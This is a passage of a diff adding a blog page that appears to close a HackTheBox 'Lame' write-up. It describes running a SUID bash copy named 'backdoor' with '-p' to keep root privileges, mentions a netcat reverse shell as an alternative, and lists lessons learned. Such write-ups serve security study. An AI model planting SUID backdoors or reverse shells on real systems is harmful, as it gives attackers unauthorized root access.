+<p>Upon executing <code>./backdoor -p</code> which is now a bash SUID, it maintained the roots privileges and opened a new shell as root.
+We could have achieved the same using <em>dash</em> in which we wouldn&rsquo;t have had to provide any additional flag and still would have gotten the root shell.</p>
+<p>There are easier way of doing things, for example, we could have just made a file with a nc reverse shell command in it and open a new listener and catch the shell that way. But this is much nicer way of doing it in my opinion, I like to open as less amount of connections as possible.</p>
+<p>Let&rsquo;s go get our loot.</p>
+<p><img src="/HackTheBox/htb-lame/gotroot.png" alt="Got Root.txt"></p>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ol>
+<li>It&rsquo;s essential to perform a detailed enumeration process to be able to find and leverage the entire attack surface at your disposal.
+<ol>
+<li>Perform complete scan of the target</li>
+<li>Perform manual enumeration while scans are running in the background to understand more about the machine</li>
+<li>Use the newly gathered information to perform even more targeted enumeration</li>
+</ol>
+</li>
+<li>Efficiently ruling out exploits from searchsploit output</li>
+<li>Patch and update your system and services regularly. Disable services that are not required, and/or employ firewall to restrict access to internal services.</li>
+</ol>
+
+</article>
+</div>
+
+
+                
+                    <div class="content-margin">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "n00bsec" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+                
+            </div>
+<footer>
+    <article>Made with love...and copious amounts of coffee</article>
+</footer>
+
+</main>
+    </body>
+</html>
